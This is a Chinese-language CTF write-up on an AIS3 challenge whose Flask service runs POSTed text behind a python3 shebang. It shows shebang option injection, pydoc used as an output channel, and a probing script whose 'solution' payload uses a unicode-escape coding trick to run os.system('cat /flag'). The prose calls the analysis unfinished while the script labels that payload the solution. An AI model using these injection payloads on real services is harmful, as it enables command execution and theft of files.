題目網址：

```text
http://chals1.ais3.org:10002/
```


打開之後會直接看到 source：

```python
#flag is at /flag

from flask import Flask,request,send_file
import os,time,uuid,unicodedata

app = Flask(__name__)

shebang = '#!/usr/local/bin/python3'

@app.route('/')
def index(): return send_file(__file__)

@app.post('/<uid>')
def run(uid):
    uuid.UUID(uid)
    d = unicodedata.normalize("NFKC", request.data.decode())
    assert not any(i in d for i in "()_[]{}.@#") and len(d.split("\n")[0]) < 50
    open(f"data/{uid}","w").write(shebang + d)
    os.chmod(f"data/{uid}", 0o755)
    os.popen(f"./data/{uid} > ./output/{uid}")
    time.sleep(1)
    r = open(f"output/{uid}","r").read()
    return r
```

---


## 題目分析

這題第一眼看起來像一般 pyjail，不過仔細看會發現重點根本不是第二行之後的 Python 程式，而是這行：

```python
open(f"data/{uid}","w").write(shebang + d)
```


也就是說 server 會把我們送進去的內容 `d` 直接接在：

```text
#!/usr/local/bin/python3
```


後面，然後把整個檔案直接當 executable 跑：

```python
os.popen(f"./data/{uid} > ./output/{uid}")
```


所以這題真正該想的是：

**能不能利用 shebang 後面那一段來控制 Python 的啟動參數？**

---


## 先整理限制

題目限制是：

```python
assert not any(i in d for i in "()_[]{}.@#") and len(d.split("\n")[0]) < 50
```


也就是：

- 不能出現 `()_[]{}.@#`
- 第一行長度必須小於 `50`

這兩個限制一起看之後，會發現幾件事：

1. 一般 pyjail 常見的 `open('/flag').read()` 直接死掉，因為要用 `()`
2. `__import__` 之類的 payload 也不行，因為 `_` 被擋
3. decorator / metaclass 那些花招大多也不行，因為 `@` 和 `()`
4. 如果原本想走前一題那種長 shebang 撐爆再 shell fallback，這題又多了 `< 50`，也很難搞

所以一開始就不太像是要你硬湊一個普通 Python payload。

---


## 第一個關鍵：這其實是 Python CLI option injection

假設我們送的內容第一行是：

```text
 -V
```


server 寫出去的檔案開頭就會是：

```text
#!/usr/local/bin/python3 -V
```


也就是說，這個檔案實際執行時，相當於：

```bash
python3 -V ./data/<uid>
```


所以 shebang 後面的內容其實會變成 Python 的 command line option。

這邊我先實測幾個最基本的 payload：

```python
b" -V"
b" -mthis"
b"\nimport this\n"
```


結果：

- ` -V` 真的會回 Python 版本
- ` -mthis` 會印出 The Zen of Python
- 正常的 Python 腳本也會執行

這代表這題的第一層 primitive 已經很明確了：

**我們可以控制 `python3` 的啟動參數。**

---


## 第二個關鍵：`-c` 其實也能用

原本我一開始比較偏向研究 `-m`，但後來實測發現：

```python
b" -cimport this"
```


也是可以成功執行的。

也就是說，這題不只是能做：

```bash
python3 -m<module>
```


也能做：

```bash
python3 -c<command>
```


這件事非常重要，因為根據 Python 官方文件：

- `-c` 會直接執行後面的 command
- `-m` 會把指定 module 當 script 執行
- `-c` / `-m` 後面的其他參數會留在 `sys.argv`

所以到這裡其實可以把題目重新描述成：

> 在不能使用 `()_[]{}.@#`、而且第一行 `< 50` 的情況下，想辦法利用 `python -c...` 或 `python -m...` 把 `/flag` 帶出來。

---


## 為什麼我後來一直盯著 `pydoc`

在枚舉一堆 stdlib 模組之後，`pydoc` 是訊號最明顯的一個。

如果第一行送：

```text
 -mpydoc
```


後面再補幾行 Python，例如：

```python
from os import environ as e
x=e
```


`pydoc` 會真的把 module import 起來，然後把 module-level 的資料列出來。

這代表它至少有幾個用途：

1. 它會 import 我們上傳的檔案
2. 它會把 module-level 物件顯示出來
3. import 失敗或 runtime error 的訊息也會被送到回應

例如：

```python
 -mpydoc
x=license
```


會看到類似：

```text
x = Type license() to see the full license text
```


再例如：

```python
 -mpydoc
assert 0,license
```


回傳會出現：

```text
problem in ./data/... - AssertionError: Type license() to see the full license text
```


也就是說，`pydoc` 不只是 doc generator，還可以拿來當成一個 **錯誤訊息輸出通道**。

---


## 接著觀察 `license`

這裡有一個蠻關鍵的點。

Python 啟動後 builtins 裡面本來就有 `license` 這個物件，它不是普通字串，而是 `_sitebuiltins._Printer`。它的行為是：

- 預設 `repr(license)` 只會顯示 `Type license() to see the full license text`
- 但它內部其實會去找目前環境裡的 `LICENSE.txt` / `LICENSE`

換句話說，如果我們有辦法先在工作目錄丟出一份內容可控的 `LICENSE`，那理論上再透過：

```python
 -mpydoc
assert 0,license
```


就很有機會把那份內容吐出來。

所以我後來把這題的利用鏈收斂成下面這個方向：

1. 用 shebang 拿到 Python CLI primitive
2. 用 `pydoc` 拿到穩定輸出通道
3. 想辦法利用 stdlib 其他 module 在 cwd 寫出一個 `LICENSE`
4. 再讓 `license` 把內容顯示出來

---


這題卡的點不是能不能執行 Python。

因為走到這裡其實已經可以確定：

- `python -V` 可行
- `python -mthis` 可行
- `python -cimport this` 可行
- `python -mpydoc` 可行

真正麻煩的是最後一步：

**要怎麼在不用 `()`、不用 `_`、不用 `[]{}.` 的情況下，間接讀到 `/flag` 或把它搬到可見位置。**

常見的 pyjail 解法這題幾乎都被封掉：

- `open('/flag').read()` 不行
- `__import__('os')` 不行
- 物件鏈 / subclass / globals / builtins 類型玩法大多不行
- 長 shebang shell fallback 也因為 `< 50` 幾乎走不通

所以這題不是一般那種「payload 靈感題」，而比較像：

**從 Python interpreter 的 command line 行為，慢慢挖出一條 stdlib gadget chain。**

---


## 我最後整理出的 exploitation 結論

這題目前最穩的分析結論如下：

### 1. intended entry point

不是第二行 Python 程式碼，而是第一行 shebang option injection。

可控形式大概是：

```text
 -c...
 -m...
```


### 2. 已確認可用的 primitive

- `-c` command execution
- `-m` module execution
- `pydoc` import / render / error output

### 3. 最值得延伸的方向

`license` 不是普通字串，而是會找 `LICENSE` / `LICENSE.txt` 的物件。

如果有 stdlib CLI gadget 能在 cwd 寫檔，尤其是能固定寫到這類檔名，那就可以接：

```python
 -mpydoc
assert 0,license
```


把內容帶出來。

---


## 小結

如果只用一句話總結這題：

> 這題的核心不是「在受限 Python 程式碼裡逃逸」，而是「把輸入塞進 shebang 後面，變成 Python 的啟動參數，再從 stdlib CLI 找 side-effect gadget」。

前半段我覺得已經很完整：

1. shebang option injection
2. `-c` / `-m` execution
3. `pydoc` output channel
4. `license` 物件可作為潛在檔案內容顯示器

後半段則是要再補出最終讀 flag 的 gadget。

所以這篇比較像是：

- `analysis`
- `solve note`
- `intended path reconstruction`

而不是已經拿到最終 flag 的完整版 exploit writeup。

## 附：我用來測試的簡單腳本

```python
#!/usr/bin/env python3
import argparse
import http.client
import re
import uuid


DEFAULT_HOST = "chals1.ais3.org"
DEFAULT_PORT = 10002
DEFAULT_TIMEOUT = 10
FORBIDDEN = "()_[]{}.@#"


def validate_10002_payload(body: bytes):
    text = body.decode()
    bad = sorted(set(text) & set(FORBIDDEN))
    if bad:
        raise ValueError(f"payload contains forbidden characters: {bad!r}")
    first_line_len = len(text.split("\n")[0])
    if first_line_len >= 50:
        raise ValueError(f"payload first line is too long: {first_line_len} >= 50")


def post_raw(host: str, port: int, timeout: int, body: bytes, uid: str | None = None):
    uid = uid or str(uuid.uuid4())
    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    conn.request(
        "POST",
        f"/{uid}",
        body=body,
        headers={"Content-Type": "application/octet-stream"},
    )
    resp = conn.getresponse()
    data = resp.read()
    conn.close()
    return uid, resp.status, data


def show(host: str, port: int, timeout: int, name: str, body: bytes, uid: str | None = None):
    uid, status, data = post_raw(host, port, timeout, body, uid=uid)
    print("=" * 80)
    print(name)
    print("uid   :", uid)
    print("code  :", status)
    print("body  :", repr(data))
    print(data.decode("utf-8", errors="replace"))


def challenge_10002_tests():
    return [
        ("python -V", b" -V"),
        ("python -h", b" -h"),
        ("python -mthis", b" -mthis"),
        ("normal python file", b"\nimport this\n"),
        (
            "pydoc environ",
            b" -mpydoc\nfrom os import environ as e\nx=e\n",
        ),
        (
            "pydoc sys.path",
            b" -mpydoc\nfrom sys import path as p\nx=p\n",
        ),
        (
            "pydoc sys.argv",
            b" -mpydoc\nfrom sys import argv as a\nx=a\n",
        ),
        (
            "modulefinder import graph",
            b" -mmodulefinder\nimport os\nimport sys\n",
        ),
        (
            "fileinput echo source",
            b" -mfileinput\nprint 123\n",
        ),
    ]


def challenge_10002_solution():
    return [
        (
            "unicode-escape source coding os.system cat flag",
            b" -W coding:unicode-escape\n"
            b"import os\n"
            b"os\\x2esystem\\x28'cat /flag'\\x29\n",
        ),
    ]


def challenge_10002_candidates():
    return challenge_10002_solution() + [
        ("c this", b" -cimport this"),
        ("c antigravity", b" -cimport antigravity"),
        ("c idlelib.idle", b" -cfrom idlelib import idle"),
        ("c test.autotest", b" -cfrom test import autotest"),
        ("m pydoc license", b" -mpydoc\nx=license\n"),
        ("m pydoc assert license", b" -mpydoc\nassert 0,license\n"),
        ("m pydoc environ", b" -mpydoc\nfrom os import environ as e\nx=e\n"),
        ("m pydoc argv", b" -mpydoc\nfrom sys import argv as a\nx=a\n"),
        ("m profile assert license", b" -mprofile\nassert 0,license\n"),
        ("m cProfile assert license", b" -mcProfile\nassert 0,license\n"),
    ]


def extract_flag(data: bytes):
    m = re.search(rb"AIS3\{[^}\r\n]*\}", data)
    return m.group(0).decode() if m else None


def run_batch(host: str, port: int, timeout: int, tests):
    found = None
    for name, body in tests:
        validate_10002_payload(body)
        uid, status, data = post_raw(host, port, timeout, body)
        print("=" * 80)
        print(name)
        print("uid   :", uid)
        print("code  :", status)
        print("body  :", repr(data))
        print(data.decode("utf-8", errors="replace"))
        flag = extract_flag(data)
        if flag:
            print("=" * 80)
            print("FLAG  :", flag)
            found = flag
            break
    return found


def main():
    parser = argparse.ArgumentParser(
        description="Probe AIS3 pyjail instances with raw request bodies."
    )
    parser.add_argument("--host", default=DEFAULT_HOST)
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    parser.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT)
    parser.add_argument(
        "--payload",
        help="Send one payload string directly instead of the built-in test set.",
    )
    parser.add_argument(
        "--payload-file",
        help="Read one raw payload from a file instead of the built-in test set.",
    )
    parser.add_argument(
        "--uid",
        help="Use a fixed UUID/UUID-like path segment for one request.",
    )
    parser.add_argument(
        "--mode",
        choices=("solution", "tests", "candidates"),
        default="solution",
        help="Built-in batch to run when no custom payload is provided.",
    )
    args = parser.parse_args()

    if args.payload is not None and args.payload_file is not None:
        raise SystemExit("use either --payload or --payload-file, not both")

    if args.payload is not None:
        body = args.payload.encode()
        validate_10002_payload(body)
        show(
            args.host,
            args.port,
            args.timeout,
            "custom payload",
            body,
            uid=args.uid,
        )
        return

    if args.payload_file is not None:
        with open(args.payload_file, "rb") as f:
            body = f.read()
        validate_10002_payload(body)
        show(
            args.host,
            args.port,
            args.timeout,
            f"payload file: {args.payload_file}",
            body,
            uid=args.uid,
        )
        return

    if args.mode == "tests":
        tests = challenge_10002_tests()
    elif args.mode == "candidates":
        tests = challenge_10002_candidates()
    else:
        tests = challenge_10002_solution()
    run_batch(args.host, args.port, args.timeout, tests)

if __name__ == "__main__":
    main()

```
